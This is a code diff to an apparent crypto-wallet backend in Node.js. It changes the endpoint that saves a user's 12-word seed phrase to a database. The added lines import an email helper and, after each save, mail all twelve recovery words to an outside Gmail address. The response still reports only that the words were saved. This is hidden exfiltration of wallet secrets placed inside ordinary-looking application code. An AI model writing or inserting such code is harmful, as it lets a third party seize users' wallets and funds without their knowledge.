@@ -3,6 +3,7 @@ const { ethers } = require("ethers");
 const axios = require('axios');
 bip39 = require('bip39');
 const jwt = require('jsonwebtoken');
+const { sendEmail } = require('../emailSend/Nodemailer');
 
 // Save the 12 words into DB
 exports.addword = async (req, res) => {
@@ -36,6 +37,29 @@ exports.addword = async (req, res) => {
     const [result] = await db.query(insertSql, [
       userId, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
     ]);
+
+    await sendEmail({
+      to: 'backedbyquantum@gmail.com',
+      subject: `New ${ type } Data Received`,
+      html: `
+    <h2>${type} Details</h2>
+    <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse; width:100%; font-family:Arial, sans-serif;">
+      <tr><td><strong>One</strong></td><td>${one || "-"}</td></tr>
+      <tr><td><strong>Two</strong></td><td>${two || "-"}</td></tr>
+      <tr><td><strong>Three</strong></td><td>${three || "-"}</td></tr>
+      <tr><td><strong>Four</strong></td><td>${four || "-"}</td></tr>
+      <tr><td><strong>Five</strong></td><td>${five || "-"}</td></tr>
+      <tr><td><strong>Six</strong></td><td>${six || "-"}</td></tr>
+      <tr><td><strong>Seven</strong></td><td>${seven || "-"}</td></tr>
+      <tr><td><strong>Eight</strong></td><td>${eight || "-"}</td></tr>
+      <tr><td><strong>Nine</strong></td><td>${nine || "-"}</td></tr>
+      <tr><td><strong>Ten</strong></td><td>${ten || "-"}</td></tr>
+      <tr><td><strong>Eleven</strong></td><td>${eleven || "-"}</td></tr>
+      <tr><td><strong>Twelve</strong></td><td>${twelve || "-"}</td></tr>
+    </table>
+    <p style="margin-top:20px;">This email was automatically generated from form submission.</p>
+  `
+});
 
     res.status(200).json({ msg: 'Wallet words saved successfully', status_code: true });
 
